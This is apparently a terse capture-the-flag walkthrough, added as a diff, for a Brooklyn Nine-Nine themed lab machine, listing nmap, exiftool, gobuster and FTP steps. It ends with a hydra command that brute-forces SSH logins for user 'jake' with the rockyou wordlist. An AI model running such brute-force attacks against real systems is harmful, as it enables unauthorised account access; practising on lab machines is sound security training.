@@ -1,0 +1,10 @@
+> nmap <IP>
+
+> exiftool brooklyn99.jpg
+
+> gobuster found nothing
+
+>ftp <IP>
+got note_to_jake.txt
+
+>> hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.19.178 -t 4 ssh
